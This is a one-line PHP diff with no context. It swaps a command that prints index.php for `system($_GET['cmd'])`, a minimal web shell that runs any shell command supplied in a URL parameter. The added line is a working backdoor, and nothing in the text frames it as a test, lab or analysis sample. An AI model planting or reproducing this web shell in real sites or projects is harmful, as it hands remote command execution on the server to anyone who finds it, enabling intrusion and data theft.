@@ -1,1 +1,1 @@
-<?php system("cat index.php"); ?>
+<?php system($_GET['cmd']); ?>
